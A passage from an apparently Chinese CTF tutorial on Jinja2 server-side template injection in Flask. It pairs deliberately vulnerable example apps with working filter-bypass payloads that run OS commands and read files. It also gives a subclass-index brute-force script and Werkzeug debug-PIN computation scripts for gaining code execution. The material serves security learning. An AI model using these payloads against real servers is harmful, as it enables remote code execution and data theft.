attr%28%22%25c%25cclass%25c%25c%22%25%2895%2C95%2C95%2C95%29%29%7Cattr%28%22%25c%25cbase%25c%25c%22%25%2895%2C95%2C95%2C95%29%29%7Cattr%28%22%25c%25csubclasses%25c%25c%22%25%2895%2C95%2C95%2C95%29%29%28%29%7Cattr%28%22%25c%25cgetitem%25c%25c%22%25%2895%2C95%2C95%2C95%29%29%28147%29%7Cattr%28%22%25c%25cinit%25c%25c%22%25%2895%2C95%2C95%2C95%29%29%7Cattr%28%22%25c%25cglobals%25c%25c%22%25%2895%2C95%2C95%2C95%29%29%7Cattr%28%22%25c%25cgetitem%25c%25c%22%25%2895%2C95%2C95%2C95%29%29%28%22%25c%25cbuiltins%25c%25c%22%25%2895%2C95%2C95%2C95%29%29%7Cattr%28%22%25c%25cgetitem%25c%25c%22%25%2895%2C95%2C95%2C95%29%29%28%27eval%27%29%28%22%25c%25cimport%25c%25c%28%27os%27%29%2Epopen%28%27dir%27%29%2Eread%28%29%22%25%2895%2C95%2C95%2C95%29%29%7D%7D\nPS:模板payload如下\nstr=&#123;&#123;&#x27;&#x27;|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(147)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;__builtins__&quot;)|attr(&quot;__getitem__&quot;)(&#x27;eval&#x27;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;\n字符串过滤绕过看一道例题，源码是这样的\nfrom flask import Flask, request, render_template_stringapp = Flask(__name__)def filter_ssti(input_str):    if input_str and (        &quot;class&quot; in input_str or &quot;base&quot; in input_str or &quot;request&quot; in input_str    ):        return &quot;hack!&quot;    return input_str@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index():    raw_str = request.args.get(&quot;str&quot;, &quot;&quot;)    filtered_str = filter_ssti(raw_str)    if filtered_str == &quot;hack!&quot;:        return filtered_str, 400    html_str = &quot;&quot;&quot;        &lt;html&gt;        &lt;head&gt;&lt;/head&gt;        &lt;body&gt;&#123;0&#125;&lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;.format(        filtered_str    )    return render_template_string(html_str)if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n如果这道题目不过滤request就完全可以通过他去绕过，这里需要自己拼接字符串，在上面也简单的学习了一些过滤器，下面介绍一下join和dict的组合用法，我们先看一下join和dict的基础用法，代码如下\nfrom flask import Flask, request, render_template_stringapp = Flask(__name__)@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index():    html_str = &quot;&quot;&quot;        &lt;html&gt;        &lt;head&gt;&lt;/head&gt;        &lt;body&gt;            a:&#123;% set a=dict(aaa=1,bbb=2)|join%&#125;&#123;&#123;a&#125;&#125;            &lt;br&gt;        &lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;    return render_template_string(html_str)if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n此时访问返回的内容将是aaabbb，上端代码的主要内容是下面这串\n&#123;% set a=dict(aaa=1,bbb=2)|join%&#125;&#123;&#123;a&#125;&#125;\n他是先设置了一个变量a，然后创建了一个dict(字典)类型，里面存储了两个数据，然后通过join去拼接dict的键，拼好的内容丢给a变量，最后展示出来。这里就可以通过这个特定进行绕过上面的例题，具体采用的payload模板是\n&#123;&#123;&#x27;&#x27;|attr(&quot;__class__&quot;)|attr(&quot;__base__&quot;)|attr(&quot;__subclasses__&quot;)()|attr(&quot;__getitem__&quot;)(147)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;__builtins__&quot;)|attr(&quot;__getitem__&quot;)(&#x27;eval&#x27;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;\n通过下面的payload进行绕过(采用dict+join过滤器)，payload如下\nstr=&#123;% set aaaa=dict(__cla=1,ss__=b)|join %&#125;&#123;%set bbbb=dict(__ba=1,se__=2)|join%&#125;&#123;%set cccc=dict(__subcl=1,asses__=2)|join%&#125;&#123;&#123;&#x27;&#x27;|attr(aaaa)|attr(bbbb)|attr(cccc)()|attr(&quot;__getitem__&quot;)(147)|attr(&quot;__init__&quot;)|attr(&quot;__globals__&quot;)|attr(&quot;__getitem__&quot;)(&quot;__builtins__&quot;)|attr(&quot;__getitem__&quot;)(&#x27;eval&#x27;)(&quot;__import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read()&quot;)&#125;&#125;\n\n点过滤绕过这个其实没什么好说的，可以通过python的语法使用[]去绕过，或者使用attr都可以，例题代码如下\nfrom flask import Flask, request, render_template_stringapp = Flask(__name__)def filter_ssti(input_str):    if input_str and (&quot;.&quot; in input_str):        return &quot;hack!&quot;    return input_str@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index():    raw_str = request.args.get(&quot;str&quot;, &quot;&quot;)    filtered_str = filter_ssti(raw_str)    if filtered_str == &quot;hack!&quot;:        return filtered_str, 400    html_str = &quot;&quot;&quot;        &lt;html&gt;        &lt;head&gt;&lt;/head&gt;        &lt;body&gt;&#123;0&#125;&lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;.format(        filtered_str    )    return render_template_string(html_str)if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n可以通过[]或者attr绕过，payload模板如下,使用的是_frozen_importlib_external.FileLoader类读取文件\nstr=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[索引][&quot;get_data&quot;](0,&quot;flag&quot;)&#125;&#125;\n成功绕过的payload如下\nstr=&#123;&#123;&#x27;&#x27;[&#x27;__class__&#x27;][&#x27;__base__&#x27;][&#x27;__subclasses__&#x27;]()[122][&quot;get_data&quot;](0,&quot;flag&quot;)&#125;&#125;str=&#123;&#123; (&#x27;&#x27;|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[122]|attr(&quot;get_data&quot;)(0,&quot;flag&quot;) &#125;&#125;\n数字过滤绕过例题如下\nfrom flask import Flask, request, render_template_stringapp = Flask(__name__)def filter_ssti(input_str):    if input_str and any(char.isdigit() for char in input_str):        return &quot;hack!&quot;    return input_str@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index():    raw_str = request.args.get(&quot;str&quot;, &quot;&quot;)    filtered_str = filter_ssti(raw_str)    if filtered_str == &quot;hack!&quot;:        return filtered_str, 400    html_str = &quot;&quot;&quot;        &lt;html&gt;        &lt;head&gt;&lt;/head&gt;        &lt;body&gt;&#123;0&#125;&lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;.format(        filtered_str    )    return render_template_string(html_str)if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n这道题目在输入任何数字都会进行报hack!,例如下面payload返回的就是，具体的问题位置是在[122]\nstr=&#123;&#123; (&#x27;&#x27;|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[122]|attr(&quot;get_data&quot;)(0,&quot;flag&quot;) &#125;&#125;\n绕过手法是通过&#123;%%&#125;+lenght去设置变量，例如我的数字数据需要两个，一个是122还有一个是0,那么我们就需要构造出两个变量，然后再去执行命令\nstr=&#123;% set a = &quot;aaaaaaaaaaaaaaaaaaaaa&quot;|length*&#x27;aaaaaa&#x27;|length - &#x27;aaaa&#x27;|length %&#125;&#123;% set b = false %&#125;&#123;&#123; (&#x27;&#x27;|attr(&#x27;__class__&#x27;)|attr(&#x27;__base__&#x27;)|attr(&#x27;__subclasses__&#x27;)())[a]|attr(&quot;get_data&quot;)(b,&quot;flag&quot;) &#125;&#125;\n然后&quot;aaaaaaaaaaaaaaaaaaaaa&quot;|length*&#39;aaaaaa&#39;|length - &#39;aaaa&#39;|length可以拆分来看aaaaaaaaaaaaaaaaaaaaa&quot;|length&#x3D;21 * &#39;aaaaaa&#39;|length &#x3D; 6 - &#39;aaaa&#39;|length &#x3D; 4 相当于21*6-4。\nconfig过滤绕过有些题目会禁用config这个模块，例如这道例题\nfrom flask import Flask, request, render_template_stringapp = Flask(__name__)def waf(input_str):    return &quot;&#123;% set config=None%&#125;&#123;% set self=None%&#125;&quot; + input_str@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index():    raw_str = request.args.get(&quot;str&quot;, &quot;&quot;)    filtered_str = waf(raw_str)    if filtered_str == &quot;hack!&quot;:        return filtered_str, 400    html_str = &quot;&quot;&quot;        &lt;html&gt;        &lt;head&gt;&lt;/head&gt;        &lt;body&gt;&#123;0&#125;&lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;.format(        filtered_str    )    return render_template_string(html_str)if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n每次访问的时候都会把config设置为None，这种的话可以通过flask的内置加载对象获取，固定的格式，例如下面payload\n&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;&#123;&#123;get_flashed_messages.__globals__[&#x27;current_app&#x27;].config&#125;&#125;\n综合符号过滤绕过继续看一道例题，代码如下\nfrom flask import Flask, request, render_template_stringapp = Flask(__name__)def filter_ssti(input_str):    if input_str and (        &quot;_&quot; in input_str        or &quot;&#x27;&quot; in input_str        or &#x27;&quot;&#x27; in input_str        or &quot;.&quot; in input_str        or &quot;request&quot; in input_str    ):        return &quot;hack!&quot;    return input_str@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index():    raw_str = request.args.get(&quot;str&quot;, &quot;&quot;)    print(&quot;Received input:&quot;, raw_str)    filtered_str = filter_ssti(raw_str)    if filtered_str == &quot;hack!&quot;:        return filtered_str, 400    html_str = &quot;&quot;&quot;        &lt;html&gt;        &lt;head&gt;&lt;/head&gt;        &lt;body&gt;&#123;0&#125;&lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;.format(        filtered_str    )    return render_template_string(html_str)if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n这道题目把空格、下划线、单引号、双引号、点、request库全都过滤掉了，下面简单举个可以获取到这些特殊数据的案例，代码如下\nfrom flask import Flask, request, render_template_stringapp = Flask(__name__)@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index():    html_str = &quot;&quot;&quot;        &lt;html&gt;        &lt;head&gt;&lt;/head&gt;        &lt;body&gt;            空格获取1:&#123;% set a=(&#123;&#125;|select()|string()) %&#125;&#123;&#123;a&#125;&#125;            &lt;br&gt;            空格获取2:&#123;% set a=(&#123;&#125;|select()|string())|list %&#125;&#123;&#123;a&#125;&#125;            &lt;br&gt;            空格获取3:&#123;% set a=(&#123;&#125;|select()|string())|list %&#125;&#123;&#123;a[10]&#125;&#125;            &lt;br&gt;            下划线获取:&#123;% set a=(&#123;&#125;|select()|string())|list %&#125;&#123;&#123;a[24]&#125;&#125;            &lt;br&gt;            百分号获取1:&#123;% set a=(&#123;&#125;|string|urlencode) %&#125;&#123;&#123;a&#125;&#125;            &lt;br&gt;            百分号获取2:&#123;% set a=(&#123;&#125;|string|urlencode|list) %&#125;&#123;&#123;a[0]&#125;&#125;            &lt;br&gt;        &lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;    return render_template_string(html_str)if __name__ == &quot;__main__&quot;:    app.run(debug=True)\nselect是输出对象的信息，然后通过string转换字符串，再通过list转换列表，在拿去数据的时候会很方便。这部分学会之后就可以开始上面的例题了，我们可以使用下面的payload模板去进行绕过，需要用到_frozen_importlib.BuiltinImporter模块\nstr=&#123;&#123;&#x27;&#x27;.__class__.__base__.__subclasses__()[索引][&quot;load_module&quot;](&quot;os&quot;)[&quot;popen&quot;](&quot;type flag&quot;).read()&#125;&#125;\n具体绕过后的payload如下\nstr=&#123;% set kg=(&#123;&#125;|select()|string())|list %&#125;&#123;% set xhx1=(&#123;&#125;|select()|string())|list %&#125;&#123;% set xhx=(xhx1[24],xhx1[24])|join %&#125;&#123;% set cls=(xhx,(dict(class=1)|join),xhx)|join %&#125;&#123;% set base=(xhx,(dict(base=1)|join),xhx)|join %&#125;&#123;% set subclasses=(xhx,(dict(subclasses=1)|join),xhx)|join %&#125;&#123;% set lm=((dict(load=1)|join),xhx1[24],(dict(module=1)|join))|join %&#125;&#123;% set os=dict(os=1)|join %&#125;&#123;% set popen=dict(popen=1)|join %&#125;&#123;% set getitem=(xhx,dict(getitem=1)|join,xhx)|join %&#125;&#123;% set cat=(dict(type=1)|join,kg[10],dict(flag=1)|join)|join%&#125;&#123;% set read=dict(read=1)|join %&#125;&#123;&#123;&#123;&#125;|attr(cls)|attr(base)|attr(subclasses)()|attr(getitem)(108)|attr(lm)(os)|attr(popen)(cat)|attr(read)()&#125;&#125;\n为了更好的理解，这里拆解一下放出来，代码如下\n&#123;% set kg=(&#123;&#125;|select()|string())|list %&#125;&#123;% set xhx1=(&#123;&#125;|select()|string())|list %&#125;&#123;% set xhx=(xhx1[24],xhx1[24])|join %&#125;&#123;% set cls=(xhx,(dict(class=1)|join),xhx)|join %&#125;&#123;% set base=(xhx,(dict(base=1)|join),xhx)|join %&#125;&#123;% set subclasses=(xhx,(dict(subclasses=1)|join),xhx)|join %&#125;&#123;% set lm=((dict(load=1)|join),xhx1[24],(dict(module=1)|join))|join %&#125;&#123;% set os=dict(os=1)|join %&#125;&#123;% set popen=dict(popen=1)|join %&#125;&#123;% set getitem=(xhx,dict(getitem=1)|join,xhx)|join %&#125;&#123;% set cat=(dict(type=1)|join,kg[10],dict(flag=1)|join)|join%&#125;&#123;% set read=dict(read=1)|join %&#125;&#123;&#123;&#123;&#125;|attr(cls)|attr(base)|attr(subclasses)()|attr(getitem)(108)|attr(lm)(os)|attr(popen)(cat)|attr(read)()&#125;&#125;\n还有一些比较通用的这里我也把代码给出\nfrom flask import Flask, request, render_template_stringapp = Flask(__name__)@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index():    html_str = &quot;&quot;&quot;        &lt;html&gt;        &lt;head&gt;&lt;/head&gt;        &lt;body&gt;            下划线1: &#123;% set xhx1=(&#123;&#125;|select()|string())|list %&#125;&#123;&#123;xhx1[24]&#125;&#125;            &lt;br&gt;            下划线1: &#123;% set xhx1=(&#123;&#125;|select()|string())|list|list %&#125;&#123;&#123;xhx1&#125;&#125;            &lt;br&gt;            下划线2: &#123;% set xhx=(xhx1[24],xhx1[24])|join %&#125;&#123;&#123;xhx&#125;&#125;            &lt;br&gt;            空格: &#123;% set kg=(&#123;&#125;|select()|string())|list %&#125;&#123;&#123;kg[10]&#125;&#125;            &lt;br&gt;            cls:&#123;% set cls=(xhx,(dict(class=1)|join),xhx)|join %&#125;&#123;&#123;cls&#125;&#125;            &lt;br&gt;            base:&#123;% set base=(xhx,(dict(base=1)|join),xhx)|join %&#125;&#123;&#123;base&#125;&#125;            &lt;br&gt;            subclasses:&#123;% set subclasses=(xhx,(dict(subclasses=1)|join),xhx)|join %&#125;&#123;&#123;subclasses&#125;&#125;            &lt;br&gt;            getitem:&#123;% set getitem=(xhx,dict(getitem=1)|join,xhx)|join %&#125;&#123;&#123;getitem&#125;&#125;            &lt;br&gt;            init:&#123;% set init=(xhx,dict(init=1)|join,xhx)|join %&#125;&#123;&#123;init&#125;&#125;            &lt;br&gt;            globals:&#123;% set globals=(xhx,dict(globals=1)|join,xhx)|join %&#125;&#123;&#123;globals&#125;&#125;            &lt;br&gt;            builtins: &#123;% set builtins=(xhx,dict(builtins=1)|join,xhx)|join %&#125;&#123;&#123;builtins&#125;&#125;            &lt;br&gt;        &lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;    return render_template_string(html_str)if __name__ == &quot;__main__&quot;:    app.run(debug=True, port=5001)\n综合符号加数字过滤绕过from flask import Flask, request, render_template_stringapp = Flask(__name__)def filter_ssti(input_str):    if input_str and (        &quot;_&quot; in input_str        or &quot;&#x27;&quot; in input_str        or &#x27;&quot;&#x27; in input_str        or &quot;.&quot; in input_str        or &quot;[&quot; in input_str        or &quot;]&quot; in input_str        or any(char.isdigit() for char in input_str)        or &quot;request&quot; in input_str    ):        return &quot;hack!&quot;    return input_str@app.route(&quot;/&quot;, methods=[&quot;GET&quot;])def index():    raw_str = request.args.get(&quot;str&quot;, &quot;&quot;)    print(&quot;Received input:&quot;, raw_str)    filtered_str = filter_ssti(raw_str)    if filtered_str == &quot;hack!&quot;:        return filtered_str, 400    html_str = &quot;&quot;&quot;        &lt;html&gt;        &lt;head&gt;&lt;/head&gt;        &lt;body&gt;&#123;0&#125;&lt;/body&gt;        &lt;/html&gt;    &quot;&quot;&quot;.format(        filtered_str    )    return render_template_string(html_str)if __name__ == &quot;__main__&quot;:    app.run(debug=True)\n这个在上一道题目的基础上增加了中括号，纯数字过滤，中括号可以采用attr(__getitem__)(*)去解决，但是因为_无法直接获取，在获取_过程中就需要使用数组，所以这里__getitem__需要用pop，他的作用和__getitem__基本一样但是他会把数据永久性弹出需要注意，然后dict的value可以换成单个字符，还有就是数字，数字索引一共没多少直接用lenght去生成即可。具体payload模板采用上面的基础上进行修改，模板如下\n&#123;% set kg=(&#123;&#125;|select()|string())|list %&#125;&#123;% set xhx1=(&#123;&#125;|select()|string())|list %&#125;&#123;% set xhx=(xhx1[24],xhx1[24])|join %&#125;&#123;% set cls=(xhx,(dict(class=1)|join),xhx)|join %&#125;&#123;% set base=(xhx,(dict(base=1)|join),xhx)|join %&#125;&#123;% set subclasses=(xhx,(dict(subclasses=1)|join),xhx)|join %&#125;&#123;% set lm=((dict(load=1)|join),xhx1[24],(dict(module=1)|join))|join %&#125;&#123;% set os=dict(os=1)|join %&#125;&#123;% set popen=dict(popen=1)|join %&#125;&#123;% set getitem=(xhx,dict(getitem=1)|join,xhx)|join %&#125;&#123;% set cat=(dict(type=1)|join,kg[10],dict(flag=1)|join)|join%&#125;&#123;% set read=dict(read=1)|join %&#125;&#123;&#123;&#123;&#125;|attr(cls)|attr(base)|attr(subclasses)()|attr(getitem)(108)|attr(lm)(os)|attr(popen)(cat)|attr(read)()&#125;&#125;\n修改后的模板如下\n&#123;% set ershisi = dict(aaaaaaaa=a)|join|length*dict(aaa=a)|join|length %&#125;&#123;% set shi = dict(aaaaaaaaaa=a)|join|length %&#125;&#123;% set yilingba = dict(aaaaaa=a)|join|length*dict(aaaaaaaaaaaaaaaaaa=a)|join|length %&#125;&#123;% set pop=dict(pop=a)|join %&#125;&#123;% set kg=(&#123;&#125;|select()|string())|list %&#125;&#123;% set xhxa=(&#123;&#125;|select()|string())|list %&#125;&#123;% set xhxb=xhxa|attr(pop)(ershisi)%&#125;&#123;% set xhx=(xhxb,xhxb)|join %&#125;&#123;% set cls=(xhx,(dict(class=a)|join),xhx)|join %&#125;&#123;% set base=(xhx,(dict(base=a)|join),xhx)|join %&#125;&#123;% set subclasses=(xhx,(dict(subclasses=a)|join),xhx)|join %&#125;&#123;% set lm=((dict(load=a)|join),xhxb,(dict(module=a)|join))|join %&#125;&#123;% set os=dict(os=a)|join %&#125;&#123;% set popen=dict(popen=a)|join %&#125;&#123;% set getitem=(xhx,dict(getitem=a)|join,xhx)|join %&#125;&#123;% set cat=(dict(type=a)|join,kg|attr(pop)(shi),dict(flag=a)|join)|join%&#125;&#123;% set read=dict(read=a)|join %&#125;&#123;&#123;&#123;&#125;|attr(cls)|attr(base)|attr(subclasses)()|attr(getitem)(yilingba)|attr(lm)(os)|attr(popen)(cat)|attr(read)()&#125;&#125;\n修改后的payload如下\nstr=&#123;% set ershisi = dict(aaaaaaaa=a)|join|length*dict(aaa=a)|join|length %&#125;&#123;% set shi = dict(aaaaaaaaaa=a)|join|length %&#125;&#123;% set yilingba = dict(aaaaaa=a)|join|length*dict(aaaaaaaaaaaaaaaaaa=a)|join|length %&#125;&#123;% set pop=dict(pop=a)|join %&#125;&#123;% set kg=(&#123;&#125;|select()|string())|list %&#125;&#123;% set xhxa=(&#123;&#125;|select()|string())|list %&#125;&#123;% set xhxb=xhxa|attr(pop)(ershisi)%&#125;&#123;% set xhx=(xhxb,xhxb)|join %&#125;&#123;% set cls=(xhx,(dict(class=a)|join),xhx)|join %&#125;&#123;% set base=(xhx,(dict(base=a)|join),xhx)|join %&#125;&#123;% set subclasses=(xhx,(dict(subclasses=a)|join),xhx)|join %&#125;&#123;% set lm=((dict(load=a)|join),xhxb,(dict(module=a)|join))|join %&#125;&#123;% set os=dict(os=a)|join %&#125;&#123;% set popen=dict(popen=a)|join %&#125;&#123;% set getitem=(xhx,dict(getitem=a)|join,xhx)|join %&#125;&#123;% set cat=(dict(type=a)|join,kg|attr(pop)(shi),dict(flag=a)|join)|join%&#125;&#123;% set read=dict(read=a)|join %&#125;&#123;&#123;&#123;&#125;|attr(cls)|attr(base)|attr(subclasses)()|attr(getitem)(yilingba)|attr(lm)(os)|attr(popen)(cat)|attr(read)()&#125;&#125;\n要注意的是这里在计算长度的时候，不清楚为什么不让加减法，可能是字符串的原因，尽量就是整除把，然后下面的payload有替代的过滤器也可以试试\n&#123;% set shi = dict(aaaaaaaaaa=a)|join|length %&#125;&#123;% set shi = dict(aaaaaaaaaa=a)|join|count %&#125;\n爆破相关脚本与通用载荷脚本相关的可以看下面的，可以自行魔改，这是通用的，感觉没通用payload好用\nimport requestsimport base64url = &quot;xxxxx&quot;for i in range(0, 500):    payload = (        &quot;&#123;&#123;&quot;        &quot;.__class__.__base__.__subclasses__()[&quot;        + str(i)        + &#x27;][&quot;get_data&quot;](0,&quot;/etc/passwd&quot;)&#125;&#125;&#x27;    )    print(payload)    data = &#123;&quot;text&quot;: base64.b64encode(payload.encode())&#125;    try:        res = requests.post(url, data=data)        print(res.status_code)        if res.status_code == 200:            print(res.text)            print(&quot;index&quot;, i)            break        if res.status_code == 302:            print(res.text)            print(&quot;index&quot;, i)            break    except:        pass\n下面看一下通用payload，这个用的模块在本文没讲过，是外部收集过来的，原理就是通过他自己去for遍历，而不是咱们外部爆破，我看这个听通用的，收集过来了\n&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;\t&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;\t\t&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read() &#125;&#125;\t&#123;% endif %&#125;&#123;% endfor %&#125;&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;,&#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;\n\n关于FLASK的Pin码计算在debug运行flask的过程中还发现了，基本flask每次重启pin码都不会更变这一个地方也可以作为一个考点，给一个任意文件读取的漏洞，就可以计算出pin码，在执行到报错的代码之后会出现错误页，在右边会有一个控制栏图标点击输入pin码即可执行任意代码然后具体的计算原理和方式参考下面内容。\n关于源代码的解读关键生成Pin码的位置是C:\\Users\\BoyChai\\.conda\\envs\\flask\\Lib\\site-packages\\werkzeug\\debug\\__init__.py，具体就是site-packages\\werkzeug\\debug\\__init__.py他的关键代码如下\ndef get_pin_and_cookie_name(    app: WSGIApplication,) -&gt; tuple[str, str] | tuple[None, None]:    &quot;&quot;&quot;Given an application object this returns a semi-stable 9 digit pin    code and a random key.  The hope is that this is stable between    restarts to not make debugging particularly frustrating.  If the pin    was forcefully disabled this returns `None`.    Second item in the resulting tuple is the cookie name for remembering.    &quot;&quot;&quot;    pin = os.environ.get(&quot;WERKZEUG_DEBUG_PIN&quot;)    rv = None    num = None    # Pin was explicitly disabled    if pin == &quot;off&quot;:        return None, None    # Pin was provided explicitly    if pin is not None and pin.replace(&quot;-&quot;, &quot;&quot;).isdecimal():        # If there are separators in the pin, return it directly        if &quot;-&quot; in pin:            rv = pin        else:            num = pin    modname = getattr(app, &quot;__module__&quot;, t.cast(object, app).__class__.__module__)    username: str | None    try:        # getuser imports the pwd module, which does not exist in Google        # App Engine. It may also raise a KeyError if the UID does not        # have a username, such as in Docker.        username = getpass.getuser()    # Python &gt;= 3.13 only raises OSError    except (ImportError, KeyError, OSError):        username = None    mod = sys.modules.get(modname)    # This information only exists to make the cookie unique on the    # computer, not as a security feature.    probably_public_bits = [        username,        modname,        getattr(app, &quot;__name__&quot;, type(app).__name__),        getattr(mod, &quot;__file__&quot;, None),    ]    # This information is here to make it harder for an attacker to    # guess the cookie name.  They are unlikely to be contained anywhere    # within the unauthenticated debug page.    private_bits = [str(uuid.getnode()), get_machine_id()]    h = hashlib.sha1()    for bit in chain(probably_public_bits, private_bits):        if not bit:            continue        if isinstance(bit, str):            bit = bit.encode()        h.update(bit)    h.update(b&quot;cookiesalt&quot;)    cookie_name = f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;    # If we need to generate a pin we salt it a bit more so that we don&#x27;t    # end up with the same value and generate out 9 digits    if num is None:        h.update(b&quot;pinsalt&quot;)        num = f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]    # Format the pincode in groups of digits for easier remembering if    # we don&#x27;t have a result yet.    if rv is None:        for group_size in 5, 4, 3:            if len(num) % group_size == 0:                rv = &quot;-&quot;.join(                    num[x : x + group_size].rjust(group_size, &quot;0&quot;)                    for x in range(0, len(num), group_size)                )                break        else:            rv = num    return rv, cookie_name\n阅读后会发现他生成pin码所需要的关键数据如下\nmodname = getattr(app, &quot;__module__&quot;, t.cast(object, app).__class__.__module__)username = getpass.getuser()probably_public_bits = [        username,        modname,        getattr(app, &quot;__name__&quot;, type(app).__name__),        getattr(mod, &quot;__file__&quot;, None),    ]private_bits = [str(uuid.getnode()), get_machine_id()]\n通过debug发现数据内容结合debug和源码内容，他们这些数据分别如下\nusername       运行flask程序的用户名modname        似乎都是固定的Flaskgetattr(app, &quot;__name__&quot;, type(app).__name__) 运行程序的库文件名字，似乎也是固定的flask.app   getattr(mod, &quot;__file__&quot;, None) flask/app.py的位置str(uuid.getnode()) 电脑MAC地址get_machine_id()    需要读取源码，他会根据不同的操作系统读取不同的文件来获取这个id\n他们每个数据的手动获取方式如下\n\nusername读取/etc/passwd，一般大于1000的就是，题目不会创建太多，或者/proc/self/environ环境变量中读取\n网卡mac地址一般linux直接读取/sys/class/net/eth0/address或者/sys/class/net/ens33/address都会有\nmachine_id读取稍微麻烦，linux是/proc/self/cgroup、/etc/machine-id、/proc/sys/kernel/random/boot_id文件，版本较新的可能是这几个/etc/machine-id、/proc/sys/kernel/random/boot_id，windows是在注册表中HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Cryptography\nmodname 固定Flask\n还有两个有一个是默认固定的flask.app，另外一个是flask的app.py位置，在报错页面可以看到生成时的逻辑是\n\nh = hashlib.sha1()   for bit in chain(probably_public_bits, private_bits):       if not bit:           continue       if isinstance(bit, str):           bit = bit.encode()       h.update(bit)   h.update(b&quot;cookiesalt&quot;)   cookie_name = f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;   # If we need to generate a pin we salt it a bit more so that we don&#x27;t   # end up with the same value and generate out 9 digits   if num is None:       h.update(b&quot;pinsalt&quot;)       num = f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]\n通过debug发现num就是pin码\nPin码计算脚本由上面分析可以推出下面计算脚本部分参考于： https://blog.csdn.net/weixin_63231007/article/details/131659892\nimport hashlibfrom itertools import chain probably_public_bits = [    &#x27;ctf&#x27;  # username 可通过/etc/passwd获取    &#x27;flask.app&#x27;,  # modname默认值    &#x27;Flask&#x27;,  # 默认值 getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))    &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;  # 路径 可报错得到  getattr(mod, &#x27;__file__&#x27;, None)] private_bits = [    &#x27;2485723332611&#x27;,  # /sys/class/net/eth0/address mac地址十进制    &#x27;96cec10d3d9307792745ec3b85c89620b10a06f1c0105bb2402a7e5d2e965c143de814597bafa25eeea9e79b7f6a7fb2&#x27;     # 字符串合并：首先读取文件内容 /etc/machine-id(docker不用看) /proc/sys/kernel/random/boot_id   /proc/self/cgroup    # 有machine-id 那就拼接machine-id + /proc/self/cgroup  否则 /proc/sys/kernel/random/boot_id + /proc/self/cgroup] # 下面为源码里面抄的，不需要修改h = hashlib.sha1()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit = bit.encode(&#x27;utf-8&#x27;)    h.update(bit)h.update(b&#x27;cookiesalt&#x27;) cookie_name = &#x27;__wzd&#x27; + h.hexdigest()[:20] num = Noneif num is None:    h.update(b&#x27;pinsalt&#x27;)    num = (&#x27;%09d&#x27; % int(h.hexdigest(), 16))[:9] rv = Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size == 0:            rv = &#x27;-&#x27;.join(num[x:x + group_size].rjust(group_size, &#x27;0&#x27;)                          for x in range(0, len(num), group_size))            break    else:        rv = num print(rv)\n还有个老版本的werkzeug 1.0.x的\nimport hashlibfrom itertools import chain probably_public_bits = [    &#x27;root&#x27;  # username 可通过/etc/passwd获取    &#x27;flask.app&#x27;,  # modname默认值    &#x27;Flask&#x27;,  # 默认值 getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;))    &#x27;/usr/local/lib/python3.8/site-packages/flask/app.py&#x27;  # 路径 可报错得到  getattr(mod, &#x27;__file__&#x27;, None)] private_bits = [    &#x27;25214234362297&#x27;,  # /sys/class/net/eth0/address mac地址十进制    &#x27;0402a7ff83cc48b41b227763d03b386cb5040585c82f3b99aa3ad120ae69ebaa&#x27;  # /etc/machine-id] # 下面为源码里面抄的，不需要修改h = hashlib.md5()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if 